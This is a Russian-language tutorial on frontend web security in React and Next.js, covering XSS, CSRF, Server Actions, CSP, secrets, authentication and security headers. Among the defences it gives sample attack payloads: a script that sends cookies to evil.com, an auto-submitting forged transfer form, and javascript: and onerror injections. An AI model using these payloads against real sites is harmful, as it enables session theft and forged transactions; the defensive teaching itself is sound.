# Безопасность веб-приложений — глубокое понимание для фронтендера

## Содержание

1. [Почему фронтендеру нельзя игнорировать безопасность](#почему-фронтендеру-нельзя-игнорировать-безопасность)
2. [XSS — атака, которая не умирает](#xss--атака-которая-не-умирает)
3. [CSRF — когда браузер становится оружием](#csrf--когда-браузер-становится-оружием)
4. [Безопасность Server Actions — новая парадигма](#безопасность-server-actions--новая-парадигма)
5. [Content Security Policy — вторая линия обороны](#content-security-policy--вторая-линия-обороны)
6. [Секреты — как не оставить ключи от всех дверей на виду](#секреты--как-не-оставить-ключи-от-всех-дверей-на-виду)
7. [Аутентификация и авторизация — кто вы и что вам можно](#аутентификация-и-авторизация--кто-вы-и-что-вам-можно)
8. [HTTP-заголовки безопасности — невидимые защитники](#http-заголовки-безопасности--невидимые-защитники)
9. [Безопасность зависимостей — угроза из node_modules](#безопасность-зависимостей--угроза-из-node_modules)
10. [Безопасность в Next.js — серверные особенности](#безопасность-в-nextjs--серверные-особенности)
11. [Философия защиты — глубокая защита и безопасность по умолчанию](#философия-защиты--глубокая-защита-и-безопасность-по-умолчанию)
12. [Чек-лист безопасности](#чек-лист-безопасности)

---

## Почему фронтендеру нельзя игнорировать безопасность

Многие фронтенд-разработчики считают безопасность «заботой бэкенда». Это опасное заблуждение. В современном вебе фронтенд — это не просто «красивая картинка». Это точка входа для пользователей, место, где обрабатываются данные форм, где хранятся токены, где рендерится пользовательский контент. И именно здесь происходит большинство атак.

Представьте, что ваше приложение — это банк. Бэкенд — это хранилище денег в подвале с бронированными дверями. Но фронтенд — это окно выдачи, через которое клиенты общаются с кассиром. Если окно не защищено, неважно, насколько крепки стены хранилища — грабитель может дотянуться до денег прямо через окно.

В 2025 году OWASP Top 10 включает несколько уязвимостей, которые напрямую связаны с фронтендом: инъекции (включая XSS), broken access control, security misconfiguration. Каждая из них может быть эксплуатирована через клиентскую часть приложения.

В этой статье мы разберём основные векторы атак не как сухие определения, а как истории — с пониманием того, **почему** атака работает, **как** она развивалась исторически, и **почему** определённые защиты появились именно в такой форме.

---

## XSS — атака, которая не умирает

### Что такое XSS и почему она так живуча

XSS (Cross-Site Scripting) — это внедрение вредоносного JavaScript-кода в страницу, которую просматривает жертва. Название «Cross-Site» отражает суть атаки: злоумышленник использует один сайт (ваш), чтобы атаковать пользователя на другом контексте (его сессия, его данные).

XSS существует с 1996 года — практически с момента появления JavaScript в браузерах. Несмотря на десятилетия борьбы, она остаётся одной из самых распространённых уязвимостей. Почему? Потому что каждый раз, когда ваше приложение берёт данные от пользователя и вставляет их в HTML, создаётся потенциальная дыра.

### Анатомия атаки

Представьте блог, где пользователи могут оставлять комментарии. Если приложение вставляет текст комментария в HTML без экранирования:

```js
// Сервер формирует HTML-страницу
const html = `<div class="comment">${userComment}</div>`;
```

Злоумышленник пишет комментарий:

```html
<script>
  document.location = 'https://evil.com/steal?cookie=' + document.cookie;
</script>
```

Когда другой пользователь открывает страницу с этим комментарием, браузер видит `<script>` тег и выполняет код. Код крадёт cookies сессии и отправляет их на сервер злоумышленника. Теперь злоумышленник может войти в аккаунт жертвы.

Это **отражённый XSS** — вредоносный код приходит в URL и «отражается» от сервера обратно в страницу. Есть ещё **хранимый XSS** (код сохраняется в базе данных и показывается всем пользователям) и **DOM-based XSS** (код выполняется без участия сервера, через манипуляции с DOM).

### Как React защищает от XSS

React решает одну из главных проблем XSS — он **автоматически экранирует** все значения, вставленные в JSX. Это не случайность — React был спроектирован с учётом безопасности, и экранирование встроено в сам механизм рендеринга.

```jsx
function Comment({ text }) {
  // React экранирует HTML-теги автоматически
  return <div>{text}</div>;
}

// Если text = "<script>alert('xss')</script>"
// React отрендерит безопасный текст:
// <div>&lt;script&gt;alert('xss')&lt;/script&gt;</div>
// Браузер покажет текст как есть, скрипт НЕ выполнится
```

Почему это работает? Потому что React использует `textContent` при вставке текста в DOM, а не `innerHTML`. `textContent` вставляет текст как есть, не интерпретируя HTML-теги. Это фундаментальное отличие от старого подхода, когда сервер собирал HTML-строки вручную.

React экранирует:
- Строки в JSX-выражениях `{variable}`
- Значения атрибутов `<div title={userInput}>`
- Дочерний текст компонентов

### Когда защита React не работает

Защита React надёжна, но не абсолютна. Есть несколько сценариев, где XSS всё ещё возможен.

#### 1. URL-атрибуты

React экранирует значения атрибутов, но не проверяет **протокол** URL. Если вы позволяете пользователю вводить ссылку, он может использовать `javascript:` протокол:

```jsx
// Пользователь вводит: javascript:alert('xss')
const userUrl = "javascript:alert('xss')";

// React не экранирует это, потому что href — валидный атрибут
<a href={userUrl}>Click me</a>
// При клике выполнится alert('xss')
```

Почему React не блокирует `javascript:` URL? Потому что в некоторых случаях разработчикам legitimately нужно использовать нестандартные протоколы. Защита от таких атак — задача разработчика:

```jsx
function SafeLink({ href, children }) {
  // Разрешаем только http и https
  const isSafe = /^https?:\/\//.test(href);
  if (!isSafe) return <span>{children}</span>;
  return <a href={href}>{children}</a>;
}
```

#### 2. ref через прямой доступ к DOM

Когда вы используете `ref` для прямого доступа к DOM-элементам и устанавливаете `innerHTML`, вы обходите защиту React:

```jsx
function UserProfile({ bio }) {
  const ref = useRef(null);

  useEffect(() => {
    if (ref.current) {
      // ❌ Прямая вставка HTML — XSS возможен!
      ref.current.innerHTML = bio;
    }
  }, [bio]);

  return <div ref={ref} />;
}
```

Здесь React не участвует в рендеринге содержимого — вы делаете это вручную через DOM API. Если `bio` содержит вредоносный код, он выполнится.

#### 3. Third-party библиотеки

Библиотеки, которые рендерят HTML напрямую (markdown-парсеры, rich-text editors, шаблонизаторы), могут быть уязвимы, если не санитизируют ввод. React не может защитить от кода, который выполняется вне его контроля:

```jsx
import DOMPurify from "dompurify";
import { marked } from "marked";

function MarkdownContent({ content }) {
  // marked превращает markdown в HTML
  // DOMPurify удаляет опасные теги и атрибуты
  const cleanHtml = DOMPurify.sanitize(marked(content));
  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
}
```

Без `DOMPurify` пользователь мог бы написать в markdown: `<img src=x onerror="alert('xss')">`, и `marked` превратил бы это в реальный HTML с выполнимым JavaScript.

### dangerouslySetInnerHTML — осознанный риск

`dangerouslySetInnerHTML` — это escape-hatch в React, который позволяет вставить сырой HTML. Само название говорит об опасности — React буквально предупреждает вас: «Вы делаете что-то опасное».

```jsx
// ❌ ОПАСНО: пользовательский ввод без санитизации
function Comment({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// ✅ Безопасно: санитизация через DOMPurify
import DOMPurify from "dompurify";

function SafeHtml({ html }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p"],
    ALLOWED_ATTR: ["href"],
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

DOMPurify работает как фильтр: он разбирает HTML в дерево, удаляет все теги и атрибуты, которые не входят в белый список, и собирает безопасный HTML обратно. По умолчанию он разрешает стандартные теги форматирования, но блокирует `<script>`, `onerror`, `javascript:` URL и другие опасные конструкции.

Когда `dangerouslySetInnerHTML` оправдан:
- Рендеринг контента из CMS (Sanity, Contentful) после санитизации
- Интеграция с legacy-библиотеками (jQuery-плагины, rich-text editors)
- Рендеринг markdown/HTML из доверенного источника

Когда он НЕ оправдан:
- Пользовательский контент без санитизации — **никогда**
- Когда можно использовать обычный JSX — **всегда предпочитайте JSX**
- Для стилизации — используйте CSS-in-JS или CSS-модули

### Типы XSS в деталях

Чтобы по-настоящему понять XSS, нужно различать его три основных типа. Каждый тип имеет свою механику и свои методы защиты.

**Отражённый XSS (Reflected).** Вредоносный код приходит в URL запроса и «отражается» сервером в ответе. Классический пример — поисковая страница, которая показывает запрос пользователя:

```
https://shop.com/search?q=<script>steal()</script>
```

Сервер вставляет параметр `q` в HTML-страницу, и браузер выполняет код. Защита: экранирование вывода на сервере и в клиентском рендеринге.

**Хранимый XSS (Stored).** Вредоносный код сохраняется на сервере (в базе данных) и показывается всем пользователям. Например, комментарий в блоге, описание товара в магазине, пост в социальной сети. Это самый опасный тип — одна инъекция может поразить тысячи пользователей. Защита: санитизация при сохранении и экранирование при отображении.

**DOM-based XSS.** Вредоносный код выполняется без участия сервера — через манипуляции с DOM на клиенте. Например, приложение читает `window.location.hash` и вставляет его в `innerHTML`:

```js
// ❌ DOM-based XSS
const hash = window.location.hash.slice(1);
document.getElementById('content').innerHTML = hash;

// Если URL: https://site.com/#<img src=x onerror=alert('xss')>
// Код выполнится
```

Защита: использовать `textContent` вместо `innerHTML`, или санитизировать ввод.

---

## CSRF — когда браузер становится оружием

### Механика атаки

CSRF (Cross-Site Request Forgery) — это атака, при которой злоумышленник заставляет **браузер жертвы** выполнить нежелательный запрос к авторизованному сайту. Ключевое слово здесь — «браузер жертвы». Злоумышленник не взламывает сервер — он использует легитимный браузер пользователя как оружие.

Вот как это происходит, шаг за шагом:

1. Пользователь входит в свой банк `bank.com`. Браузер получает cookie сессии.
2. Пользователь, не выходя из банка, открывает в другой вкладке сайт `evil.com`.
3. На `evil.com` есть скрытая форма, которая автоматически отправляется при загрузке страницы:

```html
<!-- Страница на evil.com -->
<form action="https://bank.com/transfer" method="POST" style="display:none">
  <input name="to" value="hacker_account">
  <input name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

4. Браузер отправляет POST-запрос на `bank.com/transfer`. Поскольку пользователь авторизован, браузер **автоматически прикрепляет** cookie сессии `bank.com` к запросу.
5. Сервер `bank.com` видит валидный cookie и считает запрос легитимным. Деньги переведены.

Почему это работает? Потому что браузеры устроены так, что cookies привязаны к домену, а не к странице. Любой сайт может отправить запрос на `bank.com`, и браузер добавит cookies `bank.com` автоматически. Сервер не видит разницы между запросом из вашего приложения и запросом с `evil.com`.

### Почему это не просто «старая уязвимость»

CSRF существует с 2001 года, и многие разработчики считают её решённой. Но это не так. CSRF остаётся актуальной, потому что:

- Многие API всё ещё используют cookies для аутентификации
- Не все разработчики настраивают `SameSite` cookies
- В сложных приложениях с множеством поддоменов защита может быть неполной

### Три линии защиты от CSRF

#### 1. CSRF-токены — золотой стандарт

Идея проста: сервер генерирует уникальный токен для каждой сессии (или каждого запроса), вставляет его в форму, и при отправке проверяет, что токен совпадает.

Злоумышленник на `evil.com` не может узнать этот токен (политика одинакового происхождения запрещает `evil.com` читать содержимое `bank.com`). Без токена запрос будет отклонён.

```tsx
// Сервер генерирует CSRF-токен и сохраняет его в cookie
import { cookies } from "next/headers";
import { randomBytes } from "crypto";

export async function GET() {
  const token = randomBytes(32).toString("hex");
  cookies().set("csrf_token", token, {
    httpOnly: true,
    secure: true,
    sameSite: "strict",
    path: "/",
  });

  return Response.json({ csrfToken: token });
}

// Клиент отправляет токен в заголовке
async function submitForm(data: FormData) {
  const res = await fetch("/api/action", {
    method: "POST",
    headers: {
      "X-CSRF-Token": csrfToken,
    },
    body: JSON.stringify(data),
  });
}

// Сервер проверяет, что токен совпадает
export async function POST(req: Request) {
  const token = req.headers.get("X-CSRF-Token");
  const storedToken = cookies().get("csrf_token")?.value;

  if (!token || token !== storedToken) {
    return Response.json({ error: "Invalid CSRF token" }, { status: 403 });
  }

  // Обработка запроса...
}
```

Почему это работает? Потому что токен хранится в cookie с `HttpOnly` (недоступен из JavaScript для `evil.com`) и проверяется сервером. Злоумышленник может отправить запрос, но не может включить правильный токен.

#### 2. SameSite Cookies — защита на уровне браузера

Атрибут `SameSite` указывает браузеру, когда отправлять cookies:

- `SameSite=Strict` — cookie отправляется **только** при запросах к тому же домену. Если `evil.com` отправляет запрос на `bank.com`, cookie не будет прикреплен.
- `SameSite=Lax` — cookie отправляется при навигации верхнего уровня (переход по ссылке), но не при cross-site POST-запросах.
- `SameSite=None` — cookie отправляется везде (требует `Secure`).

```tsx
cookies().set("session_id", value, {
  httpOnly: true,
  secure: true,
  sameSite: "strict",
});
```

Это элегантно, потому что защита обеспечивается самим браузером, без необходимости генерировать и проверять токены. Однако `SameSite=Strict` может быть слишком агрессивным — например, пользователь, перешедший по ссылке из email на ваш сайт, не будет авторизован.

#### 3. Проверка Origin/Referer — дополнительная проверка

Сервер может проверить, откуда пришёл запрос:

```tsx
export async function POST(req: Request) {
  const origin = req.headers.get("origin") || req.headers.get("referer");
  const allowedOrigins = ["https://mysite.com"];

  if (!origin || !allowedOrigins.some((o) => origin.startsWith(o))) {
    return Response.json({ error: "Invalid origin" }, { status: 403 });
  }
}
```

Это менее надёжно, чем CSRF-токены, потому что заголовки `Origin` и `Referer` могут быть заблокированы прокси или браузерными расширениями. Но как дополнительный слой защиты — полезно.

### Почему CSRF-защита всё ещё нужна в эпоху API

С появлением REST API и JSON-форматов многие разработчики расслабились: «CSRF работает только с формами, а мы используем JSON». Но это заблуждение. Злоумышленник может отправить JSON-запрос через `fetch` или `XMLHttpRequest`:

```js
// Злоумышленник на evil.com может отправить JSON
fetch("https://bank.com/api/transfer", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  credentials: "include", // Прикрепляет cookies
  body: JSON.stringify({ to: "hacker", amount: 10000 }),
});
```

Поэтому если ваше API использует cookies для аутентификации, CSRF-защита обязательна, независимо от формата данных.

---

## Безопасность Server Actions — новая парадигма

Server Actions (React 19 / Next.js) — это относительно новая концепция, и с ней пришли новые векторы атак. Server Actions выполняются на сервере, но вызываются с клиента. Это создаёт иллюзию безопасности: «Код выполняется на сервере, значит, он защищён». Но это не так.

### CVE-2025-55182 — урок из реальности

В 2025 году в Server Actions React была обнаружена критическая уязвимость RCE (Remote Code Execution), затрагивающая версии 19.0.0–19.2.2. Злоумышленник мог выполнить произвольный код на сервере через специально сформированные запросы. Это не теоретическая уязвимость — она была эксплуатирована в реальных атаках.

**Решение:** Обновите React до 19.0.4+ / 19.1.4+ / 19.2.3+ и Next.js до 14.2.35 / 15.2.8 / 16.0.10+. Этот случай показывает, почему важно следить за security-адресами и обновлять зависимости оперативно.

### Главный принцип: никогда не доверяйте клиенту

Server Actions принимают данные от клиента. Это означает, что **все входные данные — потенциально вредоносны**. Даже если вы уверены, что форма на клиенте валидирует данные, злоумышленник может отправить запрос напрямую, минуя ваш фронтенд.

Представьте Server Action как функцию, которая принимает данные от незнакомца на улице. Вы не знаете, что он вам передал. Вы должны проверить каждую деталь, прежде чем что-то делать.

### Валидация входных данных

Валидация — это не просто «проверка формата». Это создание границы доверия между хаосом клиентских данных и порядком вашего серверного кода. Используйте библиотеки вроде Zod для строгой типизированной валидации:

```tsx
"use server";

import { z } from "zod";

const createPostSchema = z.object({
  title: z.string().min(1).max(200),
  content: z.string().min(1).max(10000),
  category: z.enum(["tech", "life", "news"]),
});

export async function createPost(formData: FormData) {
  const rawData = {
    title: formData.get("title"),
    content: formData.get("content"),
    category: formData.get("category"),
  };

  const result = createPostSchema.safeParse(rawData);
  if (!result.success) {
    return { error: result.error.flatten() };
  }

  // Теперь данные гарантированно валидны
  await db.posts.create(result.data);
  revalidatePath("/posts");
}
```

Без валидации злоумышленник может отправить `title` длиной в миллион символов, `category` со значением `DROP TABLE posts`, или вообще отправить бинарные данные вместо строк. Zod гарантирует, что в базу попадут только данные правильного типа и формата.

### Проверка авторизации — на каждом уровне

Каждый Server Action должен проверять, имеет ли пользователь право на выполнение операции. Это кажется очевидным, но на практике разработчики часто проверяют авторизацию только на уровне UI (показывают или скрывают кнопку), забывая проверить её на сервере.

```tsx
"use server";

import { auth } from "@/lib/auth";

export async function deletePost(postId: string) {
  const session = await auth();

  // Проверка 1: пользователь авторизован?
  if (!session) {
    throw new Error("Unauthorized");
  }

  // Проверка 2: пользователь владеет этим постом?
  const post = await db.posts.findById(postId);

  if (post.userId !== session.user.id) {
    throw new Error("Forbidden");
  }

  // Теперь можно удалять
  await db.posts.delete(postId);
  revalidatePath("/posts");
}
```

Злоумышленник может вызвать `deletePost` с любым `postId`, просто отправив POST-запрос на сервер. Без проверки `post.userId !== session.user.id` он может удалить чужие посты.

### Rate Limiting — защита от злоупотреблений

Server Actions могут быть вызваны многократно с высокой скоростью. Без rate limiting злоумышленник может отправить тысячи запросов в секунду — спам, brute-force, DoS-атака.

```tsx
"use server";

import { rateLimit } from "@/lib/rate-limit";

const limiter = rateLimit({
  interval: 60_000, // 1 минута
  uniqueTokenPerInterval: 50,
});

export async function sendMessage(formData: FormData) {
  try {
    await limiter.check(5, "SEND_MESSAGE"); // Максимум 5 сообщений в минуту
  } catch {
    return { error: "Too many requests" };
  }

  // Обработка сообщения...
}
```

Rate limiting особенно важен для действий, которые отправляют email, создают записи в базе данных или выполняют другие «дорогие» операции.

---

## Content Security Policy — вторая линия обороны

### Почему одной защиты от XSS недостаточно

React экранирует значения в JSX, но что если:
- Злоумышленник нашёл способ вставить `<script>` тег через `dangerouslySetInnerHTML`?
- Third-party библиотека загружает скрипт с вредоносного домена?
- В коде есть DOM-based XSS через прямой доступ к DOM?

Content Security Policy (CSP) — это **вторая линия обороны**. Даже если XSS-уязвимость существует, CSP может предотвратить выполнение вредоносного кода.

CSP — это HTTP-заголовок, который говорит браузеру: «Загружай ресурсы (скрипты, стили, изображения) только с этих доменов». Если скрипт пытается загрузиться с неразрешённого домена, браузер заблокирует его.

### Как работает CSP

Представьте, что CSP — это список гостей на закрытой вечеринке. Охранник (браузер) проверяет каждого входящего. Если вас нет в списке — вы не пройдёте, даже если у вас есть приглашение (HTML-тег).

```
Content-Security-Policy:
  default-src 'self';           // По умолчанию — только свой домен
  script-src 'self' https://cdn.google.com;  // Скрипты — с своего домена и Google CDN
  style-src 'self' 'unsafe-inline';          // Стили — свой домен + inline
  img-src 'self' data: https:;               // Изображения — свой домен, data:, любой HTTPS
  connect-src 'self' https://api.mysite.com; // API-запросы — только свой домен и api.mysite.com
  frame-ancestors 'none';       // Запрет встраивания в iframe (защита от clickjacking)
```

Если XSS-атака пытается загрузить скрипт с `evil.com`, браузер увидит, что `evil.com` нет в `script-src`, и заблокирует загрузку. Даже если вредоносный `<script>` тег попал в HTML, он не выполнится.

### Настройка CSP в Next.js

```tsx
// next.config.js
const ContentSecurityPolicy = `
  default-src 'self';
  script-src 'self' 'unsafe-eval' 'unsafe-inline';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self';
  connect-src 'self' https://api.mysite.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
`;

module.exports = {
  async headers() {
    return [
      {
        source: "/(.*)",
        headers: [
          {
            key: "Content-Security-Policy",
            value: ContentSecurityPolicy.replace(/\s{2,}/g, " ").trim(),
          },
        ],
      },
    ];
  },
};
```

Обратите внимание на `'unsafe-inline'` и `'unsafe-eval'`. Это обходные пути, которые ослабляют CSP. `'unsafe-inline'` разрешает inline-скрипты и стили, `'unsafe-eval'` разрешает `eval()`. Идеальная CSP не содержит этих директив, но на практике многие библиотеки (CSS-in-JS, аналитика) требуют `'unsafe-inline'`.

### Nonce-based CSP — строгая защита

Если вы хотите максимальную защиту, используйте nonce (number used once) — уникальный случайный токен для каждого запроса:

```tsx
// middleware.ts
import { NextResponse } from "next/server";
import { nanoid } from "nanoid";

export function middleware(request: Request) {
  const nonce = nanoid();
  const csp = `
    default-src 'self';
    script-src 'self' 'nonce-${nonce}' 'strict-dynamic';
    style-src 'self' 'nonce-${nonce}';
  `;

  const response = NextResponse.next();
  response.headers.set("x-nonce", nonce);
  response.headers.set("Content-Security-Policy", csp);

  return response;
}
```

При таком подходе inline-скрипты блокируются по умолчанию, но скрипты с правильным nonce выполняются. Злоумышленник не может угадать nonce, поэтому даже если он вставит `<script>alert('xss')</script>`, браузер его заблокирует.

### Report-Only — тестирование без риска

CSP — мощный инструмент, но неправильная настройка может сломать ваше приложение (заблокировать легитимные скрипты). Чтобы протестировать CSP без блокировки, используйте `Content-Security-Policy-Report-Only`:

```tsx
{
  key: "Content-Security-Policy-Report-Only",
  value: csp + " report-uri /api/csp-report";
}
```

Браузер будет отправлять отчёты о нарушениях на указанный URL, но не блокировать ресурсы. Это позволяет постепенно ужесточать CSP, не ломая функциональность.

---

## Секреты — как не оставить ключи от всех дверей на виду

### Проблема: клиентский код виден всем

Это фундаментальное правило веба: **всё, что отправляется в браузер, может быть увидено**. JavaScript-бандл — это не «чёрный ящик». Любой пользователь может открыть DevTools и увидеть весь ваш код, включая строки, переменные, ключи API.

Это означает, что **никогда** не храните секретные ключи в клиентском коде. Если ключ попадает в JavaScript-бандл — он больше не секрет.

### Как секреты попадают в бандл

В Next.js есть чёткое правило: переменные окружения с префиксом `NEXT_PUBLIC_` встраиваются в клиентский бандл на этапе сборки. Все остальные переменные доступны только на сервере.

```tsx
// .env.local
DATABASE_URL=postgresql://user:pass@localhost/mydb
STRIPE_SECRET_KEY=sk_live_abc123...
NEXT_PUBLIC_API_URL=https://api.mysite.com
NEXT_PUBLIC_GA_ID=G-1234567890
```

Что попадёт в клиентский бандл?

| Переменная | На сервере | На клиенте |
|---|---|---|
| `DATABASE_URL` | ✅ Доступна | ❌ Недоступна |
| `STRIPE_SECRET_KEY` | ✅ Доступна | ❌ Недоступна |
| `NEXT_PUBLIC_API_URL` | ✅ Доступна | ✅ Доступна (встроена в бандл) |
| `NEXT_PUBLIC_GA_ID` | ✅ Доступна | ✅ Доступна (встроена в бандл) |

Это разделение — ваша главная линия защиты секретов. Но ошибки случаются легко:

```tsx
// ❌ КАТАСТРОФА: секретный ключ в клиентском компоненте
"use client";

export function PaymentForm() {
  const handlePayment = async () => {
    const stripe = new Stripe(process.env.NEXT_PUBLIC_STRIPE_SECRET_KEY!);
    // sk_live_abc123... теперь в JavaScript-бандле, доступном всем!
  };
}
```

Как это происходит? Разработчик добавляет `NEXT_PUBLIC_` к переменной, не задумываясь. Next.js встраивает значение в бандл. Любой пользователь может открыть DevTools → Sources → найти строку `sk_live_abc123...`. Злоумышленник может использовать этот ключ для совершения платежей от вашего имени.

### Правильная архитектура работы с секретами

Секретные ключи должны использоваться **только** в серверном коде — Server Components, Route Handlers, Server Actions. Клиентский код никогда не должен иметь к ним доступ:

```tsx
// ✅ Правильно: серверный прокси
// app/api/create-payment/route.ts (Server Component)
import Stripe from "stripe";

export async function POST(req: Request) {
  const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!);
  const { amount, currency } = await req.json();

  const paymentIntent = await stripe.paymentIntents.create({
    amount,
    currency,
  });

  return Response.json({ clientSecret: paymentIntent.client_secret });
}

// ✅ Клиент использует только публичный ключ
// components/PaymentForm.tsx ("use client")
export function PaymentForm() {
  const [stripe] = useState(() =>
    loadStripe(process.env.NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY!)
  );
  // pk_live_... — это публичный ключ, его можно показывать
}
```

### Защита .env файлов

Файлы `.env` содержат все ваши секреты. Они **никогда** не должны попасть в git:

```bash
# .gitignore
.env
.env.local
.env.*.local
```

Если `.env` случайно попал в git — считайте все секреты скомпрометированными. Отмените все ключи, создайте новые, и добавьте `.env` в `.gitignore`.

### Ротация секретов

Секреты — не «установил и забыл». Они должны периодически меняться (ротироваться). Для production используйте специализированные сервисы:

- **Vercel Environment Variables** — для Vercel-деплоя
- **AWS Secrets Manager** / **Azure Key Vault** — для облачных инфраструктур
- **Doppler** / **Infisical** — для управления секретами в команде

Эти сервисы обеспечивают централизованное управление, аудит доступа и автоматическую ротацию.

---

## Аутентификация и авторизация — кто вы и что вам можно

### Разница между аутентификацией и авторизацией

Эти понятия часто путают, но они описывают разные вещи:

**Аутентификация** (Authentication) — проверка того, **кто вы**. Вы вводите логин и пароль, и сервер проверяет, что вы — это вы. Аналогия: паспортный контроль в аэропорту.

**Авторизация** (Authorization) — проверка того, **что вам можно**. Вы авторизованы как пассажир экономического класса, поэтому вам нельзя в бизнес-зал. Аналогия: проверка билета перед входом в зал.

Оба механизма критичны для безопасности. Ошибка в аутентификации означает, что злоумышленник может войти как другой пользователь. Ошибка в авторизации означает, что обычный пользователь может получить доступ к админским функциям.

### NextAuth.js / Auth.js — стандарт для Next.js

Auth.js (ранее NextAuth.js) — самая популярная библиотека аутентификации для Next.js. Она поддерживает множество провайдеров (GitHub, Google, email/password) и предоставляет безопасные механизмы хранения сессий.

```tsx
// lib/auth.ts
import NextAuth from "next-auth";
import GitHub from "next-auth/providers/github";
import Credentials from "next-auth/providers/credentials";

export const { handlers, auth, signIn, signOut } = NextAuth({
  providers: [
    GitHub,
    Credentials({
      credentials: {
        email: { label: "Email", type: "email" },
        password: { label: "Password", type: "password" },
      },
      authorize: async (credentials) => {
        // Валидация входных данных
        const parsed = loginSchema.safeParse(credentials);
        if (!parsed.success) return null;

        const user = await db.users.findByEmail(parsed.data.email);
        if (!user) return null;

        // Сравнение хэша пароля (никогда не храните пароли в открытом виде!)
        const isValid = await bcrypt.compare(parsed.data.password, user.passwordHash);
        if (!isValid) return null;

        return { id: user.id, email: user.email, role: user.role };
      },
    }),
  ],
  callbacks: {
    async jwt({ token, user }) {
      if (user) {
        token.role = user.role; // Добавляем роль в JWT
      }
      return token;
    },
    async session({ session, token }) {
      session.user.role = token.role; // Передаём роль в сессию
      return session;
    },
  },
  cookies: {
    sessionToken: {
      name: "session-token",
      httpOnly: true,    // Недоступен из JavaScript
      secure: process.env.NODE_ENV === "production", // Только по HTTPS
      sameSite: "lax",   // Защита от CSRF
      path: "/",
    },
  },
});
```

Обратите внимание на настройки cookies: `httpOnly` предотвращает кражу токена через XSS, `secure` гарантирует передачу только по HTTPS, `sameSite` защищает от CSRF.

### Middleware — защита маршрутов

Middleware в Next.js выполняется до рендеринга страницы. Это идеальное место для проверки авторизации:

```tsx
// middleware.ts
import { auth } from "@/lib/auth";
import { NextResponse } from "next/server";

export default auth((req) => {
  const isLoggedIn = !!req.auth;
  const isOnProtectedRoute = req.nextUrl.pathname.startsWith("/dashboard");

  if (isOnProtectedRoute && !isLoggedIn) {
    return NextResponse.redirect(new URL("/login", req.url));
  }
});

export const config = {
  matcher: ["/dashboard/:path*", "/settings/:path*"],
};
```

Middleware работает на Edge Runtime (до выполнения серверного кода), поэтому он не может использовать серверные компоненты напрямую. Но он может перенаправить неавторизованных пользователей на страницу входа.

### Проверка авторизации на каждом уровне

Защита маршрутов через middleware — это первая линия обороны. Но её недостаточно. Каждый Server Component и Server Action должен проверять авторизацию самостоятельно:

```tsx
// app/dashboard/page.tsx — Server Component
import { auth } from "@/lib/auth";
import { redirect } from "next/navigation";

export default async function DashboardPage() {
  const session = await auth();

  if (!session) {
    redirect("/login");
  }

  return <div>Welcome, {session.user.name}</div>;
}
```

```tsx
// Server Action
"use server";

import { auth } from "@/lib/auth";

export async function updateProfile(formData: FormData) {
  const session = await auth();

  if (!session) {
    throw new Error("Unauthorized");
  }

  const userId = session.user.id;
  // Обновление профиля...
}
```

Почему нужны все три уровня (middleware, Server Component, Server Action)? Потому что каждый из них защищает от разных сценариев:
- **Middleware** — блокирует неавторизованный доступ к маршрутам
- **Server Component** — проверяет авторизацию при рендеринге страницы
- **Server Action** — проверяет авторизацию при выполнении мутации

Злоумышленник может обойти middleware (отправив запрос напрямую), но не сможет обойти Server Action без валидной сессии.

---

## HTTP-заголовки безопасности — невидимые защитники

### Что такое HTTP-заголовки безопасности

HTTP-заголовки — это метаданные, которые сервер отправляет вместе с HTML-страницей. Большинство из них невидимы для пользователя, но они говорят браузеру, как обрабатывать страницу. Заголовки безопасности — это набор директив, которые защищают от различных атак.

Аналогия: если HTML-страница — это письмо, то заголовки — это конверт с пометками «Не вскрывать», «Конфиденциально», «Вернуть отправителю». Получатель (браузер) видит эти пометки и действует соответственно.

### Основные заголовки

**X-Frame-Options: DENY** — запрещает встраивание страницы в iframe. Защищает от clickjacking-атак, когда злоумышленник накладывает прозрачный iframe с вашим сайтом на свою страницу и обманом заставляет пользователя кликнуть.

```
X-Frame-Options: DENY
```

**X-Content-Type-Options: nosniff** — запрещает браузеру угадывать MIME-тип файлов. Без этого заголовка браузер может интерпретировать файл `.txt` как JavaScript и выполнить его.

```
X-Content-Type-Options: nosniff
```

**Strict-Transport-Security (HSTS)** — указывает браузеру, что сайт доступен только по HTTPS. Даже если пользователь введёт `http://mysite.com`, браузер автоматически перенаправит на `https://mysite.com`.

```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

**Referrer-Policy** — контролирует, какой URL отправляется в заголовке `Referer` при переходе на другие сайты. `strict-origin-when-cross-origin` отправляет полный URL для навигации в пределах сайта, но только домен (без пути) для cross-site запросов.

```
Referrer-Policy: strict-origin-when-cross-origin
```

**Permissions-Policy** — контролирует, какие API браузера могут использоваться (камера, микрофон, геолокация). Если ваше приложение не использует камеру, заблокируйте её:

```
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

### Применение в Next.js

```tsx
// next.config.js
const securityHeaders = [
  { key: "X-Frame-Options", value: "DENY" },
  { key: "X-Content-Type-Options", value: "nosniff" },
  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
  { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" },
  { key: "X-XSS-Protection", value: "1; mode=block" },
  { key: "Strict-Transport-Security", value: "max-age=31536000; includeSubDomains" },
];

module.exports = {
  async headers() {
    return [
      {
        source: "/(.*)",
        headers: securityHeaders,
      },
    ];
  },
};
```

Эти заголовки не требуют изменений в коде приложения — они добавляются на уровне конфигурации. Но их эффект значителен: они закрывают множество векторов атак с минимальными усилиями.

---

## Безопасность зависимостей — угроза из node_modules

### Почему зависимости — это проблема

Современный JavaScript-проект может иметь сотни зависимостей. Каждый пакет в `node_modules` — это код, написанный другими людьми, который выполняется в контексте вашего приложения. Если одна из зависимостей скомпрометирована, ваше приложение тоже скомпрометировано.

